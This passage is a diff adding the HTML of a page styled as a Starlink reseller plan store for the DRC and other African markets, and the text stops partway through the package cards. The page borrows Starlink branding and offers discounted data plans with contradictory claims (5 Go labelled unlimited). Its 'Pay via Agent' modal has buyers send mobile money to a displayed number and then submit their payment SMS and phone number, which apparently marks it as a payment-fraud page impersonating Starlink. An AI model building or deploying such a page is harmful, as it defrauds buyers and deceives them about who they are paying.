@@ -1,0 +1,1846 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="page-title">Forfaits - Starlink</title>
+    <meta name="cache-version" content="v12-ethiopia">
+    <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
+    <link rel="manifest" href="/starlink/manifest.json">
+    <meta name="theme-color" content="#000000">
+    <meta name="apple-mobile-web-app-capable" content="yes"><meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="Starlink">
+    <link rel="apple-touch-icon" href="/starlink/icons/icon-192.png">
+    <script src="/starlink/pwa-install.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css">
+    <style>
+        .card-shadow { box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); }
+        .package-card { transition: transform 0.3s ease, box-shadow 0.3s ease; cursor: pointer; }
+        .package-card:hover { transform: translateY(-4px); box-shadow: 0 8px 12px rgba(0, 0, 0, 0.15); }
+        .package-card.selected { border: 2px solid #2563eb; background-color: #eff6ff; }
+        .package-hint { font-size: 11px; color: #4b5563; margin: 8px 0 0; text-align: right; }
+        .popular-badge { position: absolute; top: -10px; right: 10px; background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); color: white; padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: bold; text-transform: uppercase; }
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 9999; justify-content: center; align-items: center; }
+        .modal-overlay.active { display: flex; }
+        .modal-content { background: white; border-radius: 12px; padding: 32px 48px; text-align: center; max-width: 380px; margin: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }
+        .spinner { width: 50px; height: 50px; border: 3px solid #e5e7eb; border-top: 3px solid #3b82f6; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .airtel-logo-container { width: 50px; height: 50px; background: #ed1c24; border-radius: 8px; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; }
+        .airtel-logo-container span { color: white; font-size: 11px; font-weight: bold; font-family: Arial, sans-serif; letter-spacing: -0.5px; }
+        .modal-title { font-size: 17px; font-weight: 600; color: #1f2937; margin-bottom: 8px; }
+        .modal-subtitle { font-size: 13px; color: #6b7280; margin-bottom: 8px; line-height: 1.4; }
+        .modal-warning { font-size: 12px; color: #9ca3af; font-style: italic; }
+        
+        /* Payment Method Selector Modal */
+        .payment-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 9998; justify-content: center; align-items: center; }
+        .payment-modal.active { display: flex; }
+        .payment-modal-content { background: white; border-radius: 16px; padding: 28px; max-width: 360px; width: 90%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
+        .payment-modal-title { font-size: 20px; font-weight: 700; color: #1f2937; text-align: center; margin-bottom: 6px; }
+        .payment-modal-subtitle { font-size: 14px; color: #6b7280; text-align: center; margin-bottom: 20px; }
+        .payment-options { display: flex; flex-direction: column; gap: 12px; }
+        .payment-option { display: flex; align-items: center; gap: 16px; padding: 16px; border: 2px solid #e5e7eb; border-radius: 12px; cursor: pointer; transition: all 0.2s; }
+        .payment-option:hover { border-color: #d1d5db; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .payment-option.airtel:hover { border-color: #ed1c24; background: #fef2f2; }
+        .payment-option.moov:hover { border-color: #f5a623; background: #fff8eb; }
+        .payment-option.lumitel:hover { border-color: #f5a623; background: #fff8eb; }
+        .payment-option.ecocash:hover { border-color: #0066B2; background: #e6f3ff; }
+        .payment-option.orange:hover { border-color: #FF6600; background: #fff5eb; }
+        .payment-option.waafi:hover { border-color: #00A651; background: #e6f9ef; }
+        .payment-option.card:hover { border-color: #1a56db; background: #e8f0fe; }
+        .payment-option.kbzpay:hover { border-color: #0060AF; background: #e8f2ff; }
+        .payment-logo { width: 50px; height: 50px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 10px; color: white; }
+        .payment-logo.airtel { background: #ed1c24; }
+        .payment-logo.moov { background: #f5a623; font-size: 9px; }
+        .payment-logo.lumitel { background: #f5a623; font-size: 8px; }
+        .payment-logo.ecocash { background: #0066B2; font-size: 8px; }
+        .payment-logo.orange { background: #FF6600; font-size: 11px; }
+        .payment-logo.waafi { background: #00A651; font-size: 10px; }
+        .payment-logo.card { background: #1a56db; font-size: 16px; }
+        .payment-logo.kbzpay { background: #0060AF; font-size: 10px; font-weight: 800; }
+        .payment-logo.vodacom { background: #e60000; padding: 0; overflow: hidden; }
+        .payment-logo.vodacom img { width: 100%; height: 100%; object-fit: contain; border-radius: 10px; }
+        .payment-info h4 { font-size: 16px; font-weight: 600; color: #1f2937; margin-bottom: 2px; }
+        .payment-info p { font-size: 12px; color: #6b7280; }
+        .payment-arrow { margin-left: auto; color: #9ca3af; }
+        .close-payment-modal { display: block; width: 100%; margin-top: 16px; padding: 12px; background: transparent; border: 1px solid #e5e7eb; border-radius: 8px; color: #6b7280; font-size: 14px; cursor: pointer; transition: all 0.2s; }
+        .close-payment-modal:hover { background: #f3f4f6; }
+        /* Configure Button */
+        .configure-btn { display: inline-flex; align-items: center; gap: 5px; margin-top: 10px; padding: 7px 16px; background: #000; border: 1.5px solid #000; border-radius: 8px; font-size: 12px; font-weight: 600; color: #fff; cursor: pointer; transition: all 0.2s; font-family: inherit; }
+        .configure-btn:hover { border-color: #333; color: #fff; background: #333; }
+        /* Configure Alert Modal */
+        .configure-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 9999; justify-content: center; align-items: flex-end; }
+        .configure-modal.active { display: flex; }
+        .configure-modal-content { background: white; border-radius: 20px 20px 0 0; padding: 28px 24px 40px; width: 100%; max-width: 480px; margin: 0 auto; box-shadow: 0 -10px 40px rgba(0,0,0,0.15); text-align: center; animation: slideUp 0.3s ease; }
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        .configure-modal-icon { width: 64px; height: 64px; background: #fef3c7; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 28px; }
+        .configure-modal-title { font-size: 18px; font-weight: 700; color: #1f2937; margin-bottom: 8px; }
+        .configure-modal-msg { font-size: 13px; color: #6b7280; line-height: 1.6; margin-bottom: 24px; }
+        .configure-subscribe-btn { width: 100%; padding: 14px; background: #2563eb; color: white; border: none; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; margin-bottom: 10px; font-family: inherit; transition: background 0.2s; }
+        .configure-subscribe-btn:hover { background: #1d4ed8; }
+        .configure-close-btn { width: 100%; padding: 12px; background: transparent; color: #6b7280; border: 1.5px solid #d1d5db; border-radius: 12px; font-size: 14px; font-weight: 500; cursor: pointer; font-family: inherit; transition: all 0.2s; }
+        .configure-close-btn:hover { border-color: #9ca3af; color: #374151; }
+        .pkg-original-price { font-size: 13px; text-decoration: line-through; color: #9ca3af; text-align: right; line-height: 1.3; }
+        .promo-tag { display: inline-block; background: #dc2626; color: white; font-size: 9px; font-weight: 800; padding: 2px 7px; border-radius: 20px; text-transform: uppercase; letter-spacing: 0.5px; margin-left: 6px; vertical-align: middle; }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <!-- Loading Modal -->
+    <div id="loadingModal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="spinner"></div>
+            <div class="airtel-logo-container" id="loadingLogo">
+                <span>airtel</span>
+            </div>
+            <h3 id="modal-title" class="modal-title">Processing in progress...</h3>
+            <p id="modal-subtitle" class="modal-subtitle">Secure redirection to the Airtel Money payment gateway</p>
+            <p id="modal-warning" class="modal-warning">Please do not refresh the page</p>
+        </div>
+    </div>
+
+    <!-- Payment Method Selector Modal -->
+    <div id="paymentMethodModal" class="payment-modal">
+        <div class="payment-modal-content">
+            <h3 class="payment-modal-title" id="paymentMethodTitle">Select Payment Method</h3>
+            <p class="payment-modal-subtitle" id="paymentMethodSubtitle">Choose how you want to pay</p>
+            
+            <div class="payment-options">
+                <!-- Airtel Money Option -->
+                <div class="payment-option airtel" id="selectAirtel" onclick="selectPaymentMethod('airtel')">
+                    <div class="payment-logo airtel">airtel</div>
+                    <div class="payment-info">
+                        <h4>Airtel Money</h4>
+                        <p id="airtelPayDesc">Pay with your Airtel wallet</p>
+                    </div>
+                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 18l6-6-6-6"/>
+                    </svg>
+                </div>
+                
+                <!-- Moov Money Option -->
+                <div class="payment-option moov" id="selectMoov" onclick="selectPaymentMethod('moov')" style="display:none;">
+                    <div class="payment-logo moov">Moov</div>
+                    <div class="payment-info">
+                        <h4>Moov Money</h4>
+                        <p>Pay with Moov Money</p>
+                    </div>
+                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 18l6-6-6-6"/>
+                    </svg>
+                </div>
+                
+                <!-- My Lumitel Option -->
+                <div class="payment-option lumitel" id="selectLumitel" onclick="selectPaymentMethod('lumitel')" style="display:none;">
+                    <div class="payment-logo lumitel">Lumitel</div>
+                    <div class="payment-info">
+                        <h4>My Lumitel</h4>
+                        <p>Pay with Lumitel</p>
+                    </div>
+                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 18l6-6-6-6"/>
+                    </svg>
+                </div>
+                
+                <!-- Vodacom Option -->
+                <div class="payment-option vodacom" id="selectVodacom" onclick="selectPaymentMethod('vodacom')" style="display:none;">
+                    <div class="payment-logo vodacom"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Vodacom_logo.svg/200px-Vodacom_logo.svg.png" alt="Vodacom" style="width:100%;height:100%;object-fit:contain;border-radius:10px;"></div>
+                    <div class="payment-info">
+                        <h4>Vodacom M-Pesa</h4>
+                        <p>Pay with Vodacom M-Pesa</p>
+                    </div>
+                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 18l6-6-6-6"/>
+                    </svg>
+                </div>
+                
+                <!-- EcoCash Option -->
+                <div class="payment-option ecocash" id="selectEcocash" onclick="selectPaymentMethod('ecocash')" style="display:none;">
+                    <div class="payment-logo ecocash">EcoCash</div>
+                    <div class="payment-info">
+                        <h4>EcoCash</h4>
+                        <p>Pay with EcoCash</p>
+                    </div>
+                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 18l6-6-6-6"/>
+                    </svg>
+                </div>
+                
+                <!-- Orange Money Option -->
+                <div class="payment-option orange" id="selectOrange" onclick="selectPaymentMethod('orange')">
+                    <div class="payment-logo orange">Orange</div>
+                    <div class="payment-info">
+                        <h4>Orange Money</h4>
+                        <p>Pay with Orange Money</p>
+                    </div>
+                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 18l6-6-6-6"/>
+                    </svg>
+                </div>
+                
+                <!-- WAAFI Option -->
+                <div class="payment-option waafi" id="selectWaafi" onclick="selectPaymentMethod('waafi')" style="display:none;">
+                    <div class="payment-logo waafi">WAAFI</div>
+                    <div class="payment-info">
+                        <h4>WAAFI</h4>
+                        <p>Pay with WAAFI</p>
+                    </div>
+                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 18l6-6-6-6"/>
+                    </svg>
+                </div>
+                
+                <!-- MTN Mobile Money Option -->
+                <div class="payment-option mtn" id="selectMtn" onclick="selectPaymentMethod('mtn')" style="display:none;">
+                    <div class="payment-logo mtn" style="background:#ffcc00;color:#000;font-weight:800;font-size:13px;display:flex;align-items:center;justify-content:center;">MTN</div>
+                    <div class="payment-info">
+                        <h4>MTN Mobile Money</h4>
+                        <p>Pay with MTN MoMo</p>
+                    </div>
+                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 18l6-6-6-6"/>
+                    </svg>
+                </div>
+
+                <!-- KBZPay Option -->
+                <div class="payment-option kbzpay" id="selectKbzpay" onclick="selectPaymentMethod('kbzpay')" style="display:none;">
+                    <div class="payment-logo kbzpay">KBZ</div>
+                    <div class="payment-info">
+                        <h4>KBZPay</h4>
+                        <p>Pay with KBZPay</p>
+                    </div>
+                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 18l6-6-6-6"/>
+                    </svg>
+                </div>
+                
+                <!-- Ethiopia Payment Option -->
+                <div class="payment-option" id="selectEthiopia" onclick="selectPaymentMethod('ethiopia')" style="display:none;">
+                    <div class="payment-logo" style="background:linear-gradient(135deg,#078930,#FCDD09,#DA121A);font-size:10px;font-weight:800;color:#fff;display:flex;align-items:center;justify-content:center;">ETH</div>
+                    <div class="payment-info">
+                        <h4>Ethiopian Banks</h4>
+                        <p>KAAFI · CBO · NIB · WEGAGEN · AHADU</p>
+                    </div>
+                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
+                </div>
+                
+                <!-- Debit Card Option -->
+                <div class="payment-option card" id="selectCard" onclick="selectPaymentMethod('card')" style="display:none;">
+                    <div class="payment-logo card">💳</div>
+                    <div class="payment-info">
+                        <h4>Debit Card</h4>
+                        <p>Pay with Visa or Mastercard</p>
+                    </div>
+                    <svg class="payment-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 18l6-6-6-6"/>
+                    </svg>
+                </div>
+            </div>
+            
+            <button class="close-payment-modal" onclick="closePaymentModal()" id="cancelPayment">Annuler</button>
+        </div>
+    </div>
+
+    <!-- Configure Alert Modal -->
+    <div id="configureModal" class="configure-modal">
+        <div class="configure-modal-content">
+            <div class="configure-modal-icon">⚙️</div>
+            <h3 class="configure-modal-title" id="configureModalTitle">No Active Package</h3>
+            <p class="configure-modal-msg" id="configureModalMsg">You don't have an active subscription for this package. Subscribe now to activate it.</p>
+            <button class="configure-subscribe-btn" id="configureSubscribeBtn">Subscribe Now</button>
+            <button class="configure-close-btn" id="configureCloseBtn">Close</button>
+        </div>
+    </div>
+
+    <!-- Agent Payment Modal (Vodacom DRC / Airtel Zambia) -->
+    <div id="agentPaymentModal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:9999;overflow-y:auto;padding:20px;box-sizing:border-box;">
+        <div style="background:#fff;border-radius:16px;max-width:420px;margin:auto;padding:28px 24px;position:relative;font-family:inherit;">
+            <button onclick="closeAgentModal()" style="position:absolute;top:14px;right:16px;background:none;border:none;font-size:22px;cursor:pointer;color:#9ca3af;">✕</button>
+
+            <!-- Step 1: Location -->
+            <div id="agStep1">
+                <div style="text-align:center;margin-bottom:20px;">
+                    <div id="agProviderLogo" style="width:56px;height:56px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-weight:800;font-size:13px;color:#fff;background:#e60000;">M-Pesa</div>
+                    <h3 id="agStep1Title" style="font-size:18px;font-weight:700;color:#111;margin:0 0 6px;">Pay via Agent</h3>
+                    <p id="agStep1Sub" style="font-size:13px;color:#6b7280;margin:0;">Enter your location to find the nearest payment agent</p>
+                </div>
+                <div id="agPackageBadge" style="background:#f3f4f6;border-radius:8px;padding:10px 14px;margin-bottom:18px;font-size:13px;color:#374151;text-align:center;"></div>
+                <label id="agLocLabel" style="display:block;font-size:13px;font-weight:600;color:#374151;margin-bottom:6px;">Your location / city <span style="font-weight:400;color:#9ca3af;">(ville / quartier)</span></label>
+                <input id="agLocation" type="text" placeholder="e.g. Kinshasa – Gombe / Lusaka" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1.5px solid #d1d5db;border-radius:10px;font-size:15px;outline:none;transition:border 0.2s;" onfocus="this.style.borderColor='#e60000'" onblur="this.style.borderColor='#d1d5db'">
+                <p id="agLocError" style="color:#dc2626;font-size:12px;margin:6px 0 0;display:none;">Please enter your location</p>
+                <button id="agFindBtn" onclick="agFindAgent()" style="width:100%;margin-top:16px;padding:14px;background:#e60000;color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;transition:opacity 0.2s;" onmouseover="this.style.opacity='0.88'" onmouseout="this.style.opacity='1'">Find Payment Agent →</button>
+                <button id="agCancelBtn1" onclick="closeAgentModal()" style="width:100%;margin-top:10px;padding:12px;background:none;border:1.5px solid #e5e7eb;border-radius:10px;font-size:14px;color:#6b7280;cursor:pointer;">Cancel</button>
+            </div>
+
+            <!-- Step 2: Loading -->
+            <div id="agStep2" style="display:none;text-align:center;padding:30px 0;">
+                <div style="width:52px;height:52px;border:4px solid #f3f4f6;border-top-color:#e60000;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 20px;"></div>
+                <p id="agStep2Title" style="font-size:15px;font-weight:600;color:#111;margin:0 0 8px;">Finding your agent...</p>
+                <p id="agStep2Sub" style="font-size:13px;color:#6b7280;margin:0;">Please wait a moment</p>
+            </div>
+
+            <!-- Step 3: Agent Number -->
+            <div id="agStep3" style="display:none;">
+                <div style="text-align:center;margin-bottom:18px;">
+                    <div style="width:52px;height:52px;background:#dcfce7;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:24px;">✅</div>
+                    <h3 id="agStep3Title" style="font-size:17px;font-weight:700;color:#111;margin:0 0 4px;">Agent Found!</h3>
+                    <p id="agStep3Sub" style="font-size:13px;color:#6b7280;margin:0;">Send your payment to the number below</p>
+                </div>
+                <div style="background:#fef2f2;border:2px solid #fca5a5;border-radius:12px;padding:18px;margin-bottom:16px;text-align:center;">
+                    <p id="agPayLabel" style="font-size:12px;font-weight:600;color:#dc2626;text-transform:uppercase;letter-spacing:0.05em;margin:0 0 6px;">Pay to this number</p>
+                    <p id="agAgentNumber" style="font-size:28px;font-weight:800;color:#111;margin:0 0 4px;letter-spacing:0.06em;"></p>
+                    <p id="agAgentName" style="font-size:13px;color:#6b7280;margin:0;"></p>
+                </div>
+                <div id="agInstructions" style="background:#fffbeb;border:1px solid #fde68a;border-radius:10px;padding:14px;font-size:13px;color:#92400e;line-height:1.6;margin-bottom:18px;display:none;"></div>
+                <div id="agAmountBox" style="background:#f0fdf4;border:1px solid #86efac;border-radius:10px;padding:12px 14px;font-size:13px;color:#15803d;text-align:center;margin-bottom:12px;font-weight:600;"></div>
+                <div style="background:#f0f4ff;border:1px solid #c7d2fe;border-radius:10px;padding:12px 14px;font-size:12px;color:#374151;line-height:1.7;margin-bottom:18px;">
+                    ⏱️ <span id="agDelayText"><strong>In case of any delay</strong>, contact our agent and quote your reference code:</span><br>
+                    <span id="agRefCode" style="display:inline-block;margin-top:6px;font-family:monospace;font-size:16px;font-weight:800;color:#1d4ed8;letter-spacing:0.12em;"></span>
+                </div>
+                <button id="agPaidBtn" onclick="agIHavePaid()" style="width:100%;padding:14px;background:#16a34a;color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;transition:opacity 0.2s;" onmouseover="this.style.opacity='0.88'" onmouseout="this.style.opacity='1'">✅ I Have Paid — Submit Confirmation</button>
+                <button id="agCancelBtn3" onclick="closeAgentModal()" style="width:100%;margin-top:10px;padding:12px;background:none;border:1.5px solid #e5e7eb;border-radius:10px;font-size:14px;color:#6b7280;cursor:pointer;">Cancel</button>
+            </div>
+
+            <!-- Step 4: Confirmation Form -->
+            <div id="agStep4" style="display:none;">
+                <div style="text-align:center;margin-bottom:18px;">
+                    <h3 id="agStep4Title" style="font-size:17px;font-weight:700;color:#111;margin:0 0 6px;">Submit Payment Proof</h3>
+                    <p id="agStep4Sub" style="font-size:13px;color:#6b7280;margin:0;">Paste your confirmation message and enter your phone number for activation</p>
+                </div>
+                <div style="margin-bottom:14px;">
+                    <label id="agConfirmLabel" style="display:block;font-size:13px;font-weight:600;color:#374151;margin-bottom:6px;">Payment Confirmation Message <span style="color:#dc2626;">*</span></label>
+                    <textarea id="agConfirmText" rows="5" placeholder="Paste the SMS or payment confirmation message you received after paying..." style="width:100%;box-sizing:border-box;padding:12px 14px;border:1.5px solid #d1d5db;border-radius:10px;font-size:13px;outline:none;resize:vertical;transition:border 0.2s;" onfocus="this.style.borderColor='#e60000'" onblur="this.style.borderColor='#d1d5db'"></textarea>
+                    <p id="agConfirmError" style="color:#dc2626;font-size:12px;margin:4px 0 0;display:none;">Please paste your confirmation message</p>
+                </div>
+                <div style="margin-bottom:14px;">
+                    <label id="agPhoneLabel" style="display:block;font-size:13px;font-weight:600;color:#374151;margin-bottom:6px;">Your Phone Number for Activation <span style="color:#dc2626;">*</span></label>
+                    <input id="agPhone" type="tel" placeholder="+243 ... or +260 ..." style="width:100%;box-sizing:border-box;padding:12px 14px;border:1.5px solid #d1d5db;border-radius:10px;font-size:15px;outline:none;transition:border 0.2s;" onfocus="this.style.borderColor='#e60000'" onblur="this.style.borderColor='#d1d5db'">
+                    <p id="agPhoneError" style="color:#dc2626;font-size:12px;margin:4px 0 0;display:none;">Please enter a valid phone number</p>
+                </div>
+                <button onclick="agSubmitConfirmation()" id="agSubmitBtn" style="width:100%;padding:14px;background:#e60000;color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;transition:opacity 0.2s;" onmouseover="this.style.opacity='0.88'" onmouseout="this.style.opacity='1'">Submit for Activation</button>
+                <button id="agBackBtn" onclick="agBackToAgent()" style="width:100%;margin-top:10px;padding:12px;background:none;border:1.5px solid #e5e7eb;border-radius:10px;font-size:14px;color:#6b7280;cursor:pointer;">← Back</button>
+            </div>
+
+            <!-- Step 5: Success -->
+            <div id="agStep5" style="display:none;text-align:center;padding:20px 0;">
+                <div style="font-size:56px;margin-bottom:16px;">🎉</div>
+                <h3 id="agStep5Title" style="font-size:20px;font-weight:700;color:#111;margin:0 0 10px;">Submitted!</h3>
+                <p id="agStep5Sub" style="font-size:14px;color:#6b7280;margin:0 0 24px;line-height:1.6;">Your payment confirmation has been received. Our team will activate your Starlink package shortly.</p>
+                <button id="agDoneBtn" onclick="closeAgentModal()" style="padding:13px 32px;background:#e60000;color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;">Done</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <header class="bg-black text-white shadow-sm">
+        <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
+            <a href="/starlink/" class="flex items-center gap-2">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" width="36" height="36" class="flex-shrink-0"><ellipse cx="100" cy="100" rx="74" ry="55" stroke="white" stroke-width="10" fill="none" transform="rotate(-25 100 100)"/><ellipse cx="100" cy="100" rx="43" ry="33" stroke="white" stroke-width="10" fill="none" transform="rotate(65 100 100)"/><circle cx="100" cy="100" r="12" fill="white"/></svg>
+                <span class="font-bold text-xl sm:text-2xl tracking-widest">STARLINK</span>
+                <span id="header-subtitle" class="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">Revendeur RDC</span>
+            </a>
+            <div class="flex items-center gap-4">
+                <button id="langToggle" onclick="toggleLanguage()" class="flex items-center gap-1 text-xs font-semibold bg-gray-800 hover:bg-gray-700 text-white px-2 py-1 sm:px-3 sm:py-1.5 rounded-full transition">
+                    <i class="uil uil-globe"></i> <span id="langLabel">EN</span>
+                </button>
+                <nav class="flex gap-2 sm:gap-4 items-center">
+                    <a href="/starlink/" class="text-gray-300 hover:text-white flex items-center gap-2">
+                        <i class="uil uil-wifi"></i> <span id="nav-status" class="hidden sm:inline">Statut</span>
+                    </a>
+                    <a href="/starlink/plans.html" class="text-white flex items-center gap-2">
+                        <i class="uil uil-shopping-bag"></i> <span id="nav-plans" class="hidden sm:inline">Forfaits</span>
+                    </a>
+                    <a href="/starlink/orders.html" class="text-gray-300 hover:text-white hidden sm:flex items-center gap-2">
+                        <i class="uil uil-list-ul"></i> <span id="nav-orders" class="hidden sm:inline">Commandes</span>
+                    </a>
+                    <div id="auth-nav" class="flex items-center gap-2"></div>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="max-w-7xl mx-auto px-4 py-8">
+        <div class="pb-28 space-y-6">
+            
+            <!-- Page Header -->
+            <div class="bg-gradient-to-br from-gray-800 to-black text-white p-6 sm:p-8 rounded-3xl card-shadow">
+                <div class="flex items-center justify-between mb-4">
+                    <div>
+                        <p id="plans-subtitle" class="text-blue-400 text-xs sm:text-sm font-semibold uppercase tracking-widest">Forfaits Internet</p>
+                        <h1 id="plans-title" class="text-2xl sm:text-3xl font-black mt-2">Choisissez Votre Forfait</h1>
+                    </div>
+                    <div class="w-16 h-16 sm:w-20 sm:h-20 bg-blue-600 bg-opacity-20 rounded-full flex items-center justify-center">
+                        <i class="uil uil-shopping-bag text-4xl sm:text-5xl text-blue-400"></i>
+                    </div>
+                </div>
+                <p id="plans-desc" class="text-gray-400 text-sm">Cliquez sur un forfait pour voir les options de paiement Mobile Money (Airtel, Moov, Lumitel, EcoCash, Orange).</p>
+            </div>
+
+            <!-- Package Cards -->
+            <div class="space-y-4">
+                <!-- Monthly packages — CD only, hidden for all other countries -->
+                <div class="monthly-cd-card package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="basique-m" data-cdf="3000" data-original-cdf="5000" style="display:none;">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="w-14 h-14 bg-green-100 rounded-xl flex items-center justify-center">
+                                <i class="uil uil-signal-alt-3 text-2xl text-green-600"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-bold text-lg text-gray-900">Forfait Basique</h3>
+                                <p class="text-gray-500 text-sm">5 Go /mois</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p class="pkg-original-price">CDF 5,000</p>
+                            <p class="pkg-price text-2xl font-black text-green-600">CDF 3,000 <span class="promo-tag">PROMO</span></p>
+                            <p class="text-xs text-gray-500">/mois</p>
+                        </div>
+                    </div>
+                    <div class="mt-4 flex flex-wrap gap-2">
+                        <span class="text-xs bg-green-100 text-green-600 px-3 py-1 rounded-full">Données illimitées</span>
+                        <span class="text-xs bg-green-100 text-green-600 px-3 py-1 rounded-full">Économique</span>
+                    </div>
+                </div>
+
+                <div class="monthly-cd-card package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="standard-m" data-cdf="5000" data-original-cdf="8000" style="display:none;">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="w-14 h-14 bg-blue-100 rounded-xl flex items-center justify-center">
+                                <i class="uil uil-bolt text-2xl text-blue-600"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-bold text-lg text-gray-900">Forfait Standard</h3>
+                                <p class="text-gray-500 text-sm">15 Go /mois</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p class="pkg-original-price">CDF 8,000</p>
+                            <p class="pkg-price text-2xl font-black text-blue-600">CDF 5,000 <span class="promo-tag">PROMO</span></p>
+                            <p class="text-xs text-gray-500">/mois</p>
+                        </div>
+                    </div>
+                    <div class="mt-4 flex flex-wrap gap-2">
+                        <span class="text-xs bg-blue-100 text-blue-600 px-3 py-1 rounded-full">Données illimitées</span>
+                        <span class="text-xs bg-blue-100 text-blue-600 px-3 py-1 rounded-full">Meilleur rapport</span>
+                    </div>
+                </div>
+
+                <div class="monthly-cd-card package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="premium-m" data-cdf="8000" data-original-cdf="12000" style="display:none;">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="w-14 h-14 bg-purple-100 rounded-xl flex items-center justify-center">
+                                <i class="uil uil-rocket text-2xl text-purple-600"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-bold text-lg text-gray-900">Forfait Premium</h3>
+                                <p class="text-gray-500 text-sm">30 Go /mois</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p class="pkg-original-price">CDF 12,000</p>
+                            <p class="pkg-price text-2xl font-black text-purple-600">CDF 8,000 <span class="promo-tag">PROMO</span></p>
+                            <p class="text-xs text-gray-500">/mois</p>
+                        </div>
+                    </div>
+                    <div class="mt-4 flex flex-wrap gap-2">
+                        <span class="text-xs bg-purple-100 text-purple-600 px-3 py-1 rounded-full">Données illimitées</span>
+                        <span class="text-xs bg-purple-100 text-purple-600 px-3 py-1 rounded-full">Streaming HD</span>
+                    </div>
+                </div>
+
+                <div class="monthly-cd-card package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="pro-m" data-cdf="12000" data-original-cdf="18000" style="display:none;">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="w-14 h-14 bg-indigo-100 rounded-xl flex items-center justify-center">
+                                <i class="uil uil-shield text-2xl text-indigo-600"></i>
+                            </div>
+                            <div>
